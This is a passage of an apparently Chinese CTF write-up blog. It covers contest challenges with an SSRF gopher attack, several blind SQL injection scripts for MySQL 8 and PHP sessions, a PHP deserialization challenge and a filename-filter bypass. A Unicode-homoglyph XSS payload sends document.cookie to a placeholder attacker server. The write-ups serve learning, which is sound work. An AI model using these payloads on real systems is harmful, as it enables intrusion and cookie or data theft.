punctuation">"</span>index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>guess<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>通过<code>highlight_file</code>读取<code>config.php</code><br>但被过了，需要个字符绕过*的匹配</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/config\.php\/*$/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">255</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/index.php/config.php/'</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$t</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/index.php/config.php/'</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"$&#123;i&#125;: $&#123;t&#125;\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>payload:<code>/index.php/config.php/%80?source</code></p><h2 id="easy-sql-1"><a href="#easy-sql-1" class="headerlink" title="easy_sql_1"></a>easy_sql_1</h2><p>进去有个<code>use.php</code>,ssrf，但<code>index.php</code>的表单提交不了，没反应</p><p>要用gopher协议打post<br>然后adminadmin登录后发现给了<br><code>cookie:this_is_your_cookie=YWRtaW4=</code>，把cookie带上</p><p>cookie存在sql注入</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quotedata<span class="token operator">=</span><span class="token triple-quoted-string string">"""POST / HTTP/1.1Host: 127.0.0.1:80Content-Type: application/x-www-form-urlencodedCookie: this_is_your_cookie=LTEnKXx8dXBkYXRleG1sKDEsY29uY2F0KDEsKHNlbGVjdCBncm91cF9jb25jYXQoZmxhZykgZnJvbSBmbGFnKSwxKSwxKSM=;PHPSESSID=susn9dj4f1806v0pl5oiureek1;Content-Length: &#123;&#125;&#123;&#125;"""</span>payload<span class="token operator">=</span><span class="token string">"uname=admin&amp;passwd=admin"</span>length<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>data<span class="token operator">=</span>data<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>length<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>data<span class="token operator">=</span>quote<span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>url<span class="token operator">=</span><span class="token string">"http://182.116.62.85:28303/use.php"</span>params<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">'url'</span><span class="token punctuation">:</span><span class="token string">"gopher://127.0.0.1:80/_"</span><span class="token operator">+</span>data<span class="token punctuation">&#125;</span>headers<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">'Cookie'</span><span class="token punctuation">:</span><span class="token string">"PHPSESSID=8t4ppbs8ek3l5v5estgbttqtu3"</span><span class="token punctuation">&#125;</span>r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>params<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><h2 id="easy-sql-2"><a href="#easy-sql-2" class="headerlink" title="easy_sql_2"></a>easy_sql_2</h2><p>WAF:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/select|;|creat|like|insert| |sys|drop|union|file|show|rename|handler|alter|sys|if|prepare|execute|tables|delete|where\./i"</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'try again!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>注库名：</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>&#123;i&#125;<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span>&#123;val&#125;</code></pre><p>tables被过，不能用<code>information_schema.tables</code>;</p><p>mysql8中有<code>mysql.innodb_table_stats</code>和<code>mysql.innodb_index_stats</code>;以此获取表名</p><pre class="language-sql" data-language="sql"><code class="language-sql">admin' <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"ctf"</span><span class="token punctuation">,</span><span class="token string">"%s"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token keyword">table</span> mysql<span class="token punctuation">.</span>innodb_index_stats <span class="token keyword">order</span> <span class="token keyword">by</span> last_update <span class="token keyword">desc</span> <span class="token keyword">limit</span> <span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#</span></code></pre><p>select 被过，用MySQL8的table语句</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">TABLE</span> table_name <span class="token punctuation">[</span><span class="token keyword">ORDER</span> <span class="token keyword">BY</span> column_name<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token keyword">LIMIT</span> number <span class="token punctuation">[</span><span class="token keyword">OFFSET</span> number<span class="token punctuation">]</span><span class="token punctuation">]</span></code></pre><p>可以把<code>table t</code>简单理解成<code>select * from t</code>，和<code>select</code>的区别在于</p><ul><li><code>table</code>总是显示表的所有列</li><li><code>table</code>不允许任何的行过滤;也就是说，<code>TABLE</code>不支持任何<code>WHERE</code>子句。<br> 可以用来盲注表名</li></ul><pre class="language-sql" data-language="sql"><code class="language-sql">admin' <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"ctf"</span><span class="token punctuation">,</span><span class="token string">"%s"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token keyword">table</span> mysql<span class="token punctuation">.</span>innodb_index_stats <span class="token keyword">order</span> <span class="token keyword">by</span> last_update <span class="token keyword">desc</span> <span class="token keyword">limit</span> <span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#</span></code></pre><p>注数据</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span>hex<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">table</span> fl11aag <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>&#123;i&#125;<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span>&#123;val&#125;</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> string<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep<span class="token keyword">def</span> <span class="token function">strtohex</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    ss <span class="token operator">=</span> <span class="token string">"0x"</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>        ss <span class="token operator">+=</span>  <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ssurl<span class="token operator">=</span><span class="token string">"http://182.116.62.85:26571/login.php"</span>flag<span class="token operator">=</span><span class="token string">"flag&#123;"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#for j in ".-0123456789abcdefghijklmnopqrstuvwxyz0123456789&#123;|&#125;~":</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment">#payload="-1'||(('def','ctf','fl11aag','&#123;&#125;','',6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;(table/**/information_schema.columns/**/limit/**/3,1))#".format(flag+j)</span>        payload<span class="token operator">=</span><span class="token string">"-1'||((binary/**/&#123;&#125;)&lt;(table/**/ctf.fl11aag/**/limit/**/1,1))#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>strtohex<span class="token punctuation">(</span>flag<span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        data<span class="token operator">=</span><span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"1"</span>        <span class="token punctuation">&#125;</span>        r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token comment">#print(r.text)</span>        <span class="token keyword">if</span> <span class="token string">"username"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text <span class="token keyword">and</span> <span class="token string">"try"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token comment">#print(r.text)</span>            <span class="token comment">#print(payload)</span>            <span class="token comment">#print(j)</span>            flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><h2 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h2><p><a href="http://blog.cyberpeace.cn/Spring-Web-Flow/">http://blog.cyberpeace.cn/Spring-Web-Flow/</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>鹤城杯</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DownUnderCTF</title>
    <link href="/2021/09/28/DownUnderCTF/"/>
    <url>/2021/09/28/DownUnderCTF/</url>
    
    <content type="html"><![CDATA[<h2 id="Chainreaction"><a href="#Chainreaction" class="headerlink" title="Chainreaction"></a>Chainreaction</h2><p>进去后有登录注册，登录注册后进入到个人主页<br><img src="https://s3.bmp.ovh/imgs/2021/09/1cd2c4250830e0a1.png">      </p><p>这样一句话<code>Report a problem on this page and an admin will check out the page for any problems</code><br>XSS了吧   </p><p>就是XSS反弹admin的cookie了     </p><p>aboutme那里有过滤<code>&lt;&gt;</code>、<code>script</code></p><p>dirsearch扫到<code>/dev</code><br><code>Dev portal is still under construction. If you already have had account provisioned head over to /devchat or head to /admin if you are a site admin</code></p><p><code>/devchat</code><br><img src="https://s3.bmp.ovh/imgs/2021/09/9c839dfe5bda5f17.png"><br>提到Unicode的问题      </p><p>WP中aboutme那里的绕过用的是Unicode同型字，在这个网站<code>https://www.irongeek.com/homoglyph-attack-generator.php</code>   </p><p>比如<code>&lt;</code>的同型字：<br><img src="https://s3.bmp.ovh/imgs/2021/09/453d673bc3b74b6d.png">   </p><p>以此来绕过过滤<br><code>&quot;＞＜Ｓcript＞alert(1)＜/Ｓcript＞</code>    </p><p>payload:<code>&quot;＞＜Ｓcript＞var i = new Image;i.src=&quot;https://[my-server-url]?&quot;+document.cookie＜/Ｓcript＞</code>     </p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>DownUnderCTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PwnThyBytes 2019 Baby_SQL</title>
    <link href="/2021/09/20/BUU95/"/>
    <url>/2021/09/20/BUU95/</url>
    
    <content type="html"><![CDATA[<h2 id="PwnThyBytes-2019-Baby-SQL"><a href="#PwnThyBytes-2019-Baby-SQL" class="headerlink" title="[PwnThyBytes 2019]Baby_SQL"></a>[PwnThyBytes 2019]Baby_SQL</h2><p>首页源码由注释<code>/source.zip</code></p><p><code>login.php</code>里的SQL语句<br><img src="https://s3.bmp.ovh/imgs/2021/09/825f257913ec9b01.png">       </p><p>但<code>index.php</code>里有过滤<br><img src="https://s3.bmp.ovh/imgs/2021/09/3ebd4db23b9bee97.png">     </p><p><code>addslashes</code>函数会转义字符<br>有个<code>session_start()</code>函数<br>看WP说可以伪造<code>session</code>直接访问<code>login.php</code>从而绕过<code>index.php</code>中的过滤</p><p><strong>在phpsession里如果在php.ini中设置session.auto_start=On，那么PHP每次处理PHP文件的时候都会自动执行session_start()，但是session.auto_start默认为Off。与Session相关的另一个叫session.upload_progress.enabled，默认为On，在这个选项被打开的前提下我们在multipart POST的时候传入PHP_SESSION_UPLOAD_PROGRESS，PHP会执行session_start()</strong>     </p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://8fa62d49-2408-4b1a-9d2e-6cfb4016a8b0.node4.buuoj.cn:81/templates/login.php"</span>files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"file"</span><span class="token punctuation">:</span> <span class="token string">"123456789"</span><span class="token punctuation">&#125;</span>a <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"PHP_SESSION_UPLOAD_PROGRESS"</span><span class="token punctuation">:</span> <span class="token string">"123456789"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                  cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"PHPSESSID"</span><span class="token punctuation">:</span> <span class="token string">"test1"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'test'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                  proxies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'http'</span><span class="token punctuation">:</span> <span class="token string">"http://127.0.0.1:8080"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><p>然后在Burp中改<code>username=1&#39;%22%20or%20sleep(4)%23</code>成功延时    </p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timefiles<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token string">'1234567'</span><span class="token punctuation">&#125;</span>url<span class="token operator">=</span><span class="token string">'http://8fa62d49-2408-4b1a-9d2e-6cfb4016a8b0.node4.buuoj.cn:81/templates/login.php'</span>flag<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    low<span class="token operator">=</span><span class="token number">32</span>    high<span class="token operator">=</span><span class="token number">128</span>    mid<span class="token operator">=</span><span class="token punctuation">(</span>low<span class="token operator">+</span>high<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>low<span class="token operator">&lt;</span>high<span class="token punctuation">)</span><span class="token punctuation">:</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.6</span><span class="token punctuation">)</span>        payload<span class="token operator">=</span><span class="token string">"1'\" or ascii(substr(database(),&#123;&#125;,1))>&#123;&#125;#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>        payload_table<span class="token operator">=</span><span class="token string">"1'\" or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='ptbctf'),&#123;&#125;,1))>&#123;&#125;#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>        payload_column<span class="token operator">=</span><span class="token string">"1'\" or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='flag_tbl'),&#123;&#125;,1))>&#123;&#125;#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>        payload_data<span class="token operator">=</span><span class="token string">"1'\" or ascii(substr((select group_concat(secret) from ptbctf.flag_tbl),&#123;&#125;,1))>&#123;&#125;#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>        a<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>files<span class="token operator">=</span>files<span class="token punctuation">,</span>                    data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span><span class="token string">'123456'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                    cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span><span class="token string">'test1'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                    params<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span><span class="token string">'password'</span><span class="token punctuation">:</span><span class="token string">'123123'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'&lt;meta http-equiv="refresh" content="0; url=?p=home" />'</span> <span class="token keyword">in</span> a<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            low<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            high<span class="token operator">=</span>mid        mid<span class="token operator">=</span><span class="token punctuation">(</span>low<span class="token operator">+</span>high<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>mid<span class="token operator">==</span><span class="token number">32</span> <span class="token keyword">or</span> mid<span class="token operator">==</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>sqli</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>sqli</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BSidesCF 2020 Hurdles</title>
    <link href="/2021/09/10/BUU94/"/>
    <url>/2021/09/10/BUU94/</url>
    
    <content type="html"><![CDATA[<p>真就假猪套天下第一呗，这么多层</p><p><a href="https://blog.csdn.net/cjdgg/article/details/119881039">https://blog.csdn.net/cjdgg/article/details/119881039</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>假猪套</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>假猪套</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>极客大挑战 2020 Greatphp</title>
    <link href="/2021/09/07/BUU93/"/>
    <url>/2021/09/07/BUU93/</url>
    
    <content type="html"><![CDATA[<h2 id="极客大挑战-2020-Greatphp"><a href="#极客大挑战-2020-Greatphp" class="headerlink" title="[极客大挑战 2020]Greatphp"></a>[极客大挑战 2020]Greatphp</h2><p>给了源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">SYCLOVER</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$syc</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$lover</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">syc</span> <span class="token operator">!=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lover</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">syc</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lover</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">syc</span><span class="token punctuation">)</span><span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lover</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/\&lt;\?php|\(|\)|\"|\'/"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">syc</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>               <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">syc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>               <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Try Hard !!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span>                   <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'great'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'great'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><ul><li>利用Error原生类绕过<code>md5</code>和<code>sha1</code>      </li></ul><p>本地测试</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"llnn"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"llnn"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">!=</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"a!=b"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token 